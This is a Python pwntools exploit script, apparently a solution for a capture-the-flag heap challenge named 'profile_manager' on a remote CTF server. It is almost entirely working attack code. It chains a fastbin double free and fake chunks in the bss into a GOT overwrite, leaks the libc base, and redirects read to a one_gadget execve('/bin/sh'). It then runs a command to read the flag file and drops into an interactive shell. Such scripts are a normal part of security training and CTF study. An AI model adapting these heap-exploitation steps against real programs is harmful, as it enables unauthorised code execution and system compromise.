#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{I_HAVE_N0_1DEA}

context.arch = 'amd64'

e , l = ELF('./profile_manager-53eb91391ff43a88dfebcde578afd125d2c681f7') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

host , port = 'csie.ctf.tw' , 10140

#y = remote(host,port)
#y = process( './profile_manager' , env = {'LD_PRELOAD':'./libc.so.6'} )
#y = process( './profile_manager' )
#print util.proc.pidof(y)
#raw_input('>')

def add( name , age , size , data ):
    y.sendafter( 'ice :' , '1' )
    y.sendafter( 'Name :' , name )
    y.sendafter( 'Age :' , str( age ) )
    y.sendafter( 'ion :' , str( size ) )
    if size >= 0x90:
    	y.sendafter( 'ion :' , data )

def sho( idx ):
    y.sendafter( 'ice :' , '2' )
    y.sendafter( 'ID :' , str( idx ) )

def edt( idx , name , age , data ):
    y.sendafter( 'ice :' , '3' )
    y.sendafter( 'ID :' , str( idx ) )
    y.sendafter( 'Name :' , name )
    if name == "\x00" : return
    y.sendafter( 'Age :' , str( age ) )
    y.sendafter( 'ion :' , data )

def dle( idx ):
    y.sendafter( 'ice :' , '4' )
    y.sendafter( 'ID :' , str( idx ) )


'''
Bad VPN QAQ
So need to connect many times for sure.

* realloc( ptr , 0 ) -> free( ptr ) 
God job :)
'''

while True:

    y = remote(host,port)
    
    add( 'yuawn' , 0x21 , 0x200 , '7' * 0x70 ) # calloc yuawn :D
    add( 'yuawn' , 0x21 , 0x200 , '7' * 0x70 )
    add( 'yuawn' , 0x21 , 0x200 , '7' * 0x70 )

    try:
        edt( 1 , '\x00' , 0x21 , '7' ) # prepare double free for fastbin attack
        edt( 0 , '\x00' , 0x21 , '7' )
        edt( 1 , '\x00' , 0x21 , '7' )

        edt( 1 , p64( 0x602100 + 0x30 - 4 ) + '\x00' , 0x21 , 'a' ) # forge fake fd

        add( 'a' * 0x7 , 0x21 , 0x90 , '7' * 0x70 ) # take previous one
    
        add( 'D' * 0xc + '\x21' , 0x21 , 0x90 , '7' * 0x70 ) # modify fake size 0x21 on bss

        dle( 0 )
        dle( 1 )

        edt( 3 , p64( 0x602100 + 0x40 ) , 0x21 , 'a' ) # fastbin attack again

        add( 'yauwn' , 0x21 , 0x90 , '7' * 0x70 )

        add( 'a' * 8 + p64( e.got['read'] ) , 0x21 , 0x90 , '7' * 0x70 ) # overwite p[3] , it would ruin name pointer , because of strdup :()

        edt( 0 , '\x00' , 0 , '' ) # make a 0x21 fastbin chunk in freed list, cause the last one is invalid

        add( 'yauwn' , 0 , -1 , 'D' ) # modify p[3] name pointer with correct one, but doesn't change desc pointer we overwrote.

        sho( 3 ) # leak libc

        y.recvuntil( 'Desc : ' )
        l.address += u64( y.recvline()[:-1].ljust( 8 , '\x00' ) ) - l.symbols['read']
        log.success( 'libc -> ' + hex( l.address ) )

        # https://github.com/david942j/one_gadget
        '''
        0xf1117	execve("/bin/sh", rsp+0x70, environ)
        constraints:
            [rsp+0x70] == NULL
        '''

        one = 0xf1117

        edt( 3 , 'yuawn' , 0x7777777 , p64( l.address + one ) ) # edit it for gothijacking read_got to one

        y.sendafter( 'ice :' , '1' ) # trigger read -> one

        sleep( 0.7 )

        y.sendline( 'cat /home/`whoami`/flag' )

        y.recvuntil( 'Name :' )

        y.interactive()
        y.close()
        break
    except:
        y.close()

